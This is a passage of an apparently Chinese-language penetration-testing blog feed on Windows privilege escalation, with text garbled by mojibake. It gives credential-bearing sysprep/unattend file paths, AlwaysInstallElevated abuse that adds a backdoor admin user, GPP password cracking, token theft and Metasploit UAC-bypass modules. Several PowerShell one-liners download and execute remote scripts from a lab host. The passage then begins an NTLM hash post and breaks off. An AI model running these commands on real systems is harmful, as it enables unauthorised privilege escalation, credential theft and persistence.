title="æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯æ³„éœ²ï¼š"></a>æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯æ³„éœ²ï¼š</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">å†å†…ç½‘ä¸­é…ç½®ç¯å¢ƒæ—¶ï¼Œé€šå¸¸ä¸ä¼šé€å°è¿›è¡Œé…ç½®ï¼Œé€šå¸¸æ˜¯ç”¨è„šæœ¬è¿›è¡Œæ‰¹é‡åŒ–çš„é…ç½®ï¼Œå†è¿™ä¸€è¿‡ç¨‹ä¼šä½¿ç”¨å®‰è£…é…ç½®æ–‡ä»¶ï¼Œé‡Œé¢æœ‰æ—¶å€™ä¼šå­˜æ”¾ç€ç®¡ç†å‘˜çš„ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚è´¦æˆ·å¯†ç ç­‰ï¼Œä¸‹é¢æ˜¯éœ€è¦å…³æ³¨çš„ç›¸å…³æ–‡ä»¶ã€‚<br>    C:\sysprep.<span class="hljs-literal">inf</span><br><br>    C:\syspreg\sysprep.<span class="hljs-keyword">xml</span><br><br>    <span class="hljs-title">C</span>:\Windows\system32\sysprep.<span class="hljs-literal">inf</span><br><br>    C:\windows\system32\sysprep\sysprep.<span class="hljs-keyword">xml</span><br><br>    <span class="hljs-title">C</span>:\unattend.<span class="hljs-keyword">xml</span><br><br>    <span class="hljs-title">C</span>:\Windows\Panther\Unattend.<span class="hljs-keyword">xml</span><br><br>    <span class="hljs-title">C</span>:\Windows\Panther\Unattended.<span class="hljs-keyword">xml</span><br><br>    <span class="hljs-title">C</span>:\Windows\Panther\Unattend\Unattended.<span class="hljs-keyword">xml</span><br><br>    <span class="hljs-title">C</span>:\Windows\Panther\Unattend\Unattend.<span class="hljs-keyword">xml</span><br><br>    <span class="hljs-title">C</span>:\Windows\System32\Sysprep\Unattend.<span class="hljs-keyword">xml</span><br><br>    <span class="hljs-title">C</span>:\Windows\System32\Sysprep\Panther\Unattend.<span class="hljs-keyword">xml</span><br>  <br>  <span class="hljs-title">ä¸€ä¸ªæ˜¯Unattend</span>.xmlæ–‡ä»¶ ä¸€ä¸ªæ˜¯sysprep.xmlæ–‡ä»¶<br></code></pre></td></tr></table></figure><p>post/windows/gather/enum_unattend msfä¸­å¯¹åº”çš„æ¨¡å—</p><h2 id="æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ"><a href="#æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ" class="headerlink" title="æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ"></a>æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ</h2><p>AlwaysInstallElevatedæ˜¯ä¸€ä¸ªç­–ç•¥è®¾ç½®é¡¹ï¼Œå¦‚æœå¼€å¯çš„è¯ï¼Œwindowså…è®¸ä½æƒé™ç”¨æˆ·ä»¥systemæƒé™æ¥è¿è¡Œå®‰è£…MSIæ–‡ä»¶ã€‚</p><p>Windows Install æ˜¯windowsç³»ç»Ÿç»„ä»¶ä¹‹ä¸€ï¼Œç”¨æ¥ç®¡ç†å’Œé…ç½®è½¯ä»¶æœåŠ¡ï¼Œå®ƒç”±ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆ, Msiexec.exeå’ŒMSIæ–‡ä»¶,Msiexec.exeæ˜¯ç”¨æ¥å®‰è£…MSIæœåŠ¡çš„ï¼Œè€ŒMSIåˆ™æ˜¯ç”¨æ¥å®‰è£…ç¨‹åºçš„ï¼ŒåŒ…å«å®‰è£…å’Œå¸è½½ç¨‹åºæ—¶æ‰€åŠ è½½çš„å¤§é‡æŒ‡ä»¤å’Œæ•°æ®ã€‚</p><p>è¯¥æ¼æ´äº§ç”Ÿçš„åŸå› ï¼šWindows Installå¼€å¯äº†ç‰¹æƒå®‰è£…åŠŸèƒ½ã€‚</p><p>cmdè®¾ç½®æˆgpedit.msc æ‰“å¼€ç»„ç­–ç•¥ç¼–è¾‘å™¨ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503142148556.png" alt="image-20250314214815355"></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨å‘½ä»¤è¡Œçš„æ–¹å¼è¿›è¡Œè®¾ç½®ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®å®Œæˆä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æ³¨å†Œè¡¨ä¸­çš„ä¿¡æ¯ï¼Œæ¥åˆ¤æ–­å®ƒæ˜¯å¦è¢«å¼€å¯ã€‚</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503142206738.png" alt="image-20250314220643636"></p><p>æ˜¯1çš„è¯å°±æ˜¯å¼€å¯çš„ã€‚</p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨Poweupä¸­çš„ RegistryAlwaysInstallElevatedæ¨¡å—æ¥æ£€æŸ¥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell -nop -exec bypass IEX(<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.29.157:8081/PowerUp.ps1&#x27;</span>);<span class="hljs-keyword">Get</span>-RegAlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503142227118.png" alt="image-20250314222738015"></p><p>è¿”å›Trueå³æ˜¯èƒ½è¿›è¡Œåˆ©ç”¨çš„ï¼Œè¿”å›Falseåˆ™æ˜¯ä¸èƒ½ã€‚</p><p>Poweupè¿›è¡Œåˆ©ç”¨ï¼Œåˆ©ç”¨é‡Œé¢çš„<strong>Write-UserAddMSI</strong>æ·»åŠ ä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell -nop -exec bypass IEX(<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.29.157:8081/PowerUp.ps1&#x27;</span>);<span class="hljs-keyword">Write</span>-UserAddMSI<br></code></pre></td></tr></table></figure><p>è¿è¡Œå®Œæˆä¹‹åé¦–å…ˆä¼šåœ¨è¿è¡Œæ‰€åœ¨çš„ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªmsiæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨msiexecè¿è¡Œä¸€ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503142251566.png" alt="image-20250314225103495"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msiexec <span class="hljs-regexp">/q /i</span> UserAdd.msi<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503142251051.png" alt="image-20250314225155896"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503142252595.png" alt="image-20250314225248443"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆäº†ä¸€ä¸ªåé—¨ç”¨æˆ·åˆ°é‡Œé¢ï¼Œå¹¶ä¸”æ˜¯administratorç»„çš„ã€‚</p><p>å½“æˆ‘ä»¬è¿è¡Œå®Œæˆå…³é—­cmdä¹‹åï¼Œè¿™ä¸ªmsiæ–‡ä»¶ä¼šä¿å­˜åœ¨c:\Windows\installerä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503142303156.png" alt="image-20250314230305951"></p><p>åœ¨msfä¸­åˆ©ç”¨æ¨¡å—ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>local/always_install_elevated<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503142344134.png" alt="image-20250314234430025"></p><p>è¿™ä¸ªææƒåˆ©ç”¨æ‰‹æ³•é¦–å…ˆå…ˆæŸ¥çœ‹æ³¨å†Œè¡¨çš„ä¿¡æ¯ï¼Œçœ‹æ˜¯å¦å¼€å¯äº†ï¼Œå¦‚æœå¼€å¯çš„è¯å°±èƒ½åˆ©ç”¨AIwaysInstallElevatedè¿›è¡Œææƒã€‚</p><h2 id="Windowsç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ"><a href="#Windowsç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ" class="headerlink" title="Windowsç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ"></a>Windowsç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ</h2><p>sysvolæ˜¯æ´»åŠ¨ç›®å½•é‡Œé¢ä¸€ä¸ªç”¨äºå­˜å‚¨å…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„ä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼Œåœ¨åˆ›å»ºADçš„æ—¶å€™è‡ªè¡Œåˆ›å»ºï¼Œé»˜è®¤å®‰è£…åœ¨C:\Windowsä¸‹ï¼Œä¸»è¦ç”¨æ¥å­˜æ”¾ç™»å½•è„šæœ¬ï¼Œç»„ç­–ç•¥æ•°æ®ï¼Œä»¥åŠå…¶ä»–åŸŸæ§åˆ¶å™¨éœ€è¦çš„åŸŸä¿¡æ¯ç­‰ã€‚SYSVOLåœ¨æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·æˆ–è€…åŸŸä¿¡ä»»ç”¨æˆ·èŒƒå›´å†…å…±äº«ï¼Œèƒ½å¤ŸæŸ¥çœ‹é‡Œé¢çš„ç›¸å…³ä¿¡æ¯ï¼Œåœ¨ä¸€èˆ¬çš„åŸŸç¯å¢ƒä¸­ï¼Œé€šå¸¸æ˜¯åˆ©ç”¨è„šæœ¬è¿›è¡Œæ‰¹é‡åŒ–çš„éƒ¨ç½²ï¼Œä¸ºäº†ç»Ÿä¸€ç®¡ç†ï¼Œç½‘ç»œç®¡ç†å‘˜ä¼šè®¾ç½®åŸŸç­–ç•¥ï¼Œå½“ä¸€å°æœºå™¨åŠ å…¥åˆ°åŸŸä¸­ï¼Œæœ‰çš„æœåŠ¡é€šå¸¸ä¼šè¦æ±‚ä½¿ç”¨åŸŸç”¨æˆ·å¯†ç è¿›è¡Œç™»å½•éªŒè¯ï¼Œä¸ºäº†ä¿è¯æœ¬åœ°ç®¡ç†å‘˜å¯†ç çš„å®‰å…¨æ€§ï¼Œé€šå¸¸ä¼šè®¾ç½®ç»„ç­–ç•¥è¿›è¡Œæ‰¹é‡çš„æ›´æ”¹å¯†ç ï¼Œè¿™æ ·ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¯†ç éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”æ›´æ”¹åçš„å¯†ç ä¼šä»¥AES-256åŠ å¯†çš„å½¢å¼åœ¨SYSVOLç›®å½•ä¸‹çš„ä¸€ä¸ªxmlæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªå¯†ç æ˜¯å¯ä»¥è¿›è¡Œç ´è§£çš„ï¼Œå¾®è½¯ç»™äº†ç›¸å…³çš„<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">å¯†é’¥</a>(2012å¹´ä¹‹å‰çš„)ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ç ´è§£å‡ºå¯†ç ï¼Œä»è€Œæ§åˆ¶åŸŸä¸­ä½¿ç”¨è¯¥è´¦æˆ·çš„æœºå™¨ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503151509024.png" alt="image-20250315150950716"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503151510822.png" alt="image-20250315151005723"></p><p>powershellåˆ©ç”¨æ–¹æ³•ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell -exec bypass IEX(<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.29.157:8081/Get-GPPPassword.ps1&#x27;</span>);<span class="hljs-keyword">Get</span>-GPPPassword<br></code></pre></td></tr></table></figure><p>msfä¸‹çš„åˆ©ç”¨æ–¹æ³•ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">use post<span class="hljs-regexp">/windows/g</span>ather<span class="hljs-regexp">/credentials/g</span>pp<br>set session xxx<br>run<br></code></pre></td></tr></table></figure><h2 id="Windows-ä»¤ç‰Œçªƒå–"><a href="#Windows-ä»¤ç‰Œçªƒå–" class="headerlink" title="Windows ä»¤ç‰Œçªƒå–"></a>Windows ä»¤ç‰Œçªƒå–</h2><p>ä»¤ç‰Œæ˜¯ç³»ç»Ÿçš„ä¸´æ—¶å¯†é’¥ï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬åœ¨ä¸ä½¿ç”¨è´¦æˆ·å¯†ç çš„å‰æä¸‹è®¿é—®æŸä¸ªæœåŠ¡ï¼Œä»¤ç‰Œçš„æœ€å¤§ç‰¹ç‚¹å°±æ˜¯éšæœºæ€§ã€‚</p><p>windowsä»¤ç‰Œæ¨¡æ‹Ÿçš„æ”»å‡»å¯ä»¥ç®€å•ç†è§£æˆ æˆ‘ä»¬æ‰‹æ‹¿ç€ä¸€ä¸ªé«˜æƒé™ç”¨æˆ·çš„èº«ä»½ç‰Œ ç„¶åæ‰§è¡Œè¿™ä¸ªèº«ä»½ç‰Œæ‰€å±æƒé™èƒ½æ‰§è¡Œçš„æ“ä½œã€‚</p><p>æ ¸å¿ƒæ€æƒ³è¿˜æ˜¯kerberosåè®®è¿™ä¸ªåé¢å†ç»†çœ‹ã€‚</p><p>MSFä¸‹çš„åˆ©ç”¨ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">é€šå¸¸æ˜¯ç”±administratoræƒé™å‡çº§åˆ°systemæƒé™ å¦‚æœæ˜¯æ™®é€šæƒé™çš„è¯å¯èƒ½åˆ—å‡ºæ¥çš„ä¸å¤š<br>use incognito <span class="hljs-regexp">//</span>åœ¨meterpreteræ¨¡å¼ä¸‹ åŠ è½½incognitoæ¨¡å—<br>list_tokens -u <span class="hljs-regexp">//</span>åˆ—å‡ºå¯ç”¨çš„è®¿é—®ä»¤ç‰Œ<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span><br><br>å¦‚æœä¸Šé¢çš„ä¸è¡Œçš„è¯å¯ä»¥psçœ‹ä¸€ä¸‹ å“ªäº›è¿›ç¨‹æ˜¯sysytemæƒé™è¿è¡Œçš„<br>steal_token xxx  <span class="hljs-regexp">//</span>çªƒå–ç›¸åº”è¿›ç¨‹çš„ä»¤ç‰Œ<br>getsystem  <span class="hljs-regexp">//</span>ææƒ<br>rev2self <span class="hljs-regexp">//</span>è¿”å›åˆ°ä¹‹å‰çš„æƒé™<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503151804523.png" alt="image-20250315180420364"></p><p>è¿™ä¸ªçš„è¯å°±éœ€è¦ç”¨åˆ°psã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503151805776.png" alt="image-20250315180509461"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503151808324.png" alt="image-20250315180822207"></p><p>Powershellä¸‹çš„åº”ç”¨ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.29.157:8081/Invoke-TokenManipulation.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-Enumerate</span><br><br>powershell <span class="hljs-literal">-exec</span> bypass <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.29.157:8081/Invoke-TokenManipulation.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-CreateProcess</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-Username</span> <span class="hljs-string">&quot;nt AUTHORITY\SYSTEM&quot;</span><br><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‘½ä»¤å¾—å†ç®¡ç†å‘˜æƒé™ä¸‹è¿è¡Œã€‚</p><p>åœŸè±†ç³»åˆ—çš„ææƒã€‚</p><h2 id="ç»•è¿‡UACææƒ"><a href="#ç»•è¿‡UACææƒ" class="headerlink" title="ç»•è¿‡UACææƒ"></a>ç»•è¿‡UACææƒ</h2><p>ä»€ä¹ˆæ˜¯UACä»¥åŠUACçš„è¿è¡Œæœºåˆ¶ï¼š</p><p>è‹±æ–‡åç§°User Account Control ç®€ç§°UAC(ç”¨æˆ·è´¦æˆ·æ§åˆ¶)ï¼Œæ˜¯å¾®è½¯å…¬å¸åœ¨å…¶Windows VistaåŠæ›´é«˜ç‰ˆæœ¬æ“ä½œç³»ç»Ÿä¸­é‡‡ç”¨çš„ä¸€ç§æ§åˆ¶æœºåˆ¶ï¼Œæ—¨åœ¨é˜²æŠ¤æ¶æ„ç¨‹åºæœªç»ç”¨æˆ·åŒæ„è·å–ç³»ç»Ÿçš„æœ€é«˜æƒé™ã€‚æ— è®ºæ˜¯ç®¡ç†å‘˜ç”¨æˆ·è¿˜æ˜¯æ™®é€šç”¨æˆ· å†è¿è¡Œç¨‹åºæ—¶é»˜è®¤éƒ½æ˜¯ä½æƒé™çš„ å½“æ‰§è¡Œå¯èƒ½å±å®³åˆ°ç³»ç»Ÿå®‰å…¨çš„æ—¶å€™å°±ä¼šè§¦å‘ UAC(ä¾‹å¦‚ä¿®æ”¹æ³¨å†Œè¡¨çš„ä¿¡æ¯ è¿è¡Œç¬¬ä¸‰æ–¹ç¨‹åº æ‰§è¡Œææƒçš„æ“ä½œ) å¦‚æœæ˜¯ç®¡ç†å‘˜ç”¨æˆ·å°±éœ€è¦æˆæƒ å¦‚æœæ˜¯æ™®é€šç”¨æˆ·çš„è¯éœ€è¦è¾“å…¥ç®¡ç†å‘˜å¯†ç ã€‚</p><p>ç»•è¿‡æ‰‹æ³•ï¼š            </p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">åˆ©ç”¨ç™½åå•ç¨‹åº<br>Windows å…è®¸æŸäº›è‡ªå¸¦ç¨‹åºä»¥é«˜æƒé™è¿è¡Œï¼Œä¸è§¦å‘ UACï¼Œæ¯”å¦‚ fodhelper.exeï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ³¨å†Œè¡¨åŠ«æŒï¼Œè®©å®ƒæ‰§è¡Œè‡ªå·±çš„æ¶æ„ä»£ç ã€‚<br><br>åŠ«æŒ DLLï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰<br>ä¸€äº›é«˜æƒé™ç¨‹åºä¼šåŠ è½½ç‰¹å®šçš„ DLL æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„ DLLï¼Œè®©ç›®æ ‡ç¨‹åºè‡ªåŠ¨æ‰§è¡Œå®ƒã€‚<br><br><span class="hljs-keyword">COM</span> å¯¹è±¡åŠ«æŒ<br>Windows å†…éƒ¨çš„ <span class="hljs-keyword">COM</span> ç»„ä»¶ç®¡ç†æœ‰ä¸€äº›æƒé™æ¼æ´ï¼Œå¯ä»¥é€šè¿‡æ³¨å†Œè¡¨ä¿®æ”¹ï¼Œä½¿æŸäº›é«˜æƒé™ç¨‹åºæ‰§è¡Œæ”»å‡»è€…çš„ä»£ç ã€‚<br><br>åˆ©ç”¨CVE<span class="hljs-number">-2019</span><span class="hljs-number">-1388</span>ç»•è¿‡UACææƒ<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥UACæ˜¯å¦å¼€å¯ï¼š</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA<br><span class="hljs-number">1</span>çš„è¯æ˜¯å¼€ <span class="hljs-number">0</span>æ˜¯å…³é—­<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503152214825.png" alt="image-20250315221456455"></p><p>æ­¤æ—¶è¿™ä¸ªæ˜¯å¼€å¯çš„ã€‚</p><p>MSFä¸‹çš„åˆ©ç”¨ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>local/ask       <span class="hljs-comment"># å¼¹å‡ºUACç¡®è®¤çª—å£ï¼Œç„¶åè¯±ä½¿ç”¨æˆ·ç‚¹å‡»åè·å¾—systemæƒé™</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac  <span class="hljs-comment"># æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACçš„ç¬¬äºŒä¸ªshellã€‚</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_injection   <span class="hljs-comment"># æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»çš„å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_fodhelper   <span class="hljs-comment"># æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windows fodhelper.exeåº”ç”¨ç¨‹åºæ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows 10çš„UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_eventvwr    <span class="hljs-comment"># æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windowsäº‹ä»¶æŸ¥çœ‹å™¨æ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_comhijack    <span class="hljs-comment"># æ­¤æ¨¡å—å°†é€šè¿‡åœ¨hkcué…ç½®å•å…ƒä¸­åˆ›å»ºCOMå¤„ç†ç¨‹åºæ³¨å†Œè¡¨é¡¹æ¥ç»•è¿‡Windows UACã€‚</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503152248989.png" alt="image-20250315224848739"></p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ææƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…ç½‘æ¨ªå‘åŸºç¡€æ€»ç»“</title>
    <link href="/2025/02/20/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%80%BB%E7%BB%93/"/>
    <url>/2025/02/20/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="å†…ç½‘æ¨ªå‘åŸºç¡€æ€»ç»“"><a href="#å†…ç½‘æ¨ªå‘åŸºç¡€æ€»ç»“" class="headerlink" title="å†…ç½‘æ¨ªå‘åŸºç¡€æ€»ç»“"></a>å†…ç½‘æ¨ªå‘åŸºç¡€æ€»ç»“</h1><h2 id="è·å–åŸŸå†…å•æœºå¯†ç å’ŒHash"><a href="#è·å–åŸŸå†…å•æœºå¯†ç å’ŒHash" class="headerlink" title="è·å–åŸŸå†…å•æœºå¯†ç å’ŒHash"></a>è·å–åŸŸå†…å•æœºå¯†ç å’ŒHash</h2><p>åœ¨windows 2000ä»¥å windowséƒ½é‡‡ç”¨NTLMå¯¹ç”¨æˆ·çš„å¯†ç è¿›è¡ŒåŠ å¯† é€šå¸¸ä¿å­˜åœ¨%SystemRoot%\System32\config\SAMæ–‡ä»¶ä¸­(å¦‚æœæ˜¯åŸŸç¯å¢ƒä¸­é€šå¸¸ä¿å­˜åœ¨NTDS.ditæ–‡ä»¶ä¸­)ï¼Œé™¤äº†NTLMè¿˜æœ‰LMåŠ å¯†æ–¹å¼ï¼ŒSAMå’ŒNTDS.dité‡Œé¢å­˜æ”¾çš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">username : <span class="hljs-type">RID</span> : <span class="hljs-type">LM</span> Hash : <span class="hljs-type">NTLM</span> Hash<br></code></pre></td></tr></table></figure><p>åœ¨windows 2000ä»¥å LM hashå®ƒçš„å€¼é€šå¸¸æ˜¯aad3b435b51404eeaad3b435b51404eeï¼ˆç©ºå¯†ç ï¼‰</p><p>NTLMä¹Ÿåˆ†ä¸ºNTLM1å’ŒNTLM2 NTLM2é‡‡ç”¨çš„æ˜¯HMAC-MD5 è€Œ1é‡‡ç”¨çš„æ˜¯MD4ã€‚</p><p>å®é™…åˆ©ç”¨ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.å¦‚æœå¯†ç æ˜¯å¼±å£ä»¤çš„è¯ï¼Œç”¨ç›¸åº”çš„çˆ†ç 